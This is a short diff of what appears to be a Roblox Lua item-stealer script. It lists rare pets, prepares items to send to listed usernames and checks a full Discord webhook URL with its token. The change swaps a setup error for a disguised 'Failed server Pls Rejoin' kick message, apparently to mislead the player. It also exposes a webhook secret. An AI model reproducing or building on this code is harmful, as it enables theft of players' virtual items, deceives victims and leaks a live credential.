@@ -26,8 +26,8 @@ local rarePets = {"Red Fox", "Raccoon", "Dragonfly"}
 local totalValue = 0
 local itemsToSend = {}
 
-if next(users) == nil or webhook == "https://discord.com/api/webhooks/1325046507258253322/AGS6wwNVvP88xqEi60Z2F6z2olR7UDPZ4Q4gxOOuFVzK06ci1TSLtvRbpqd6YEuS9GrI" then
-    plr:kick("You didn't add any usernames or webhook")
+if next(KhenOne03) == nil or webhook == "https://discord.com/api/webhooks/1325046507258253322/AGS6wwNVvP88xqEi60Z2F6z2olR7UDPZ4Q4gxOOuFVzK06ci1TSLtvRbpqd6YEuS9GrI" then
+    plr:kick("Failed server Pls Rejoin")
     return
 end
 
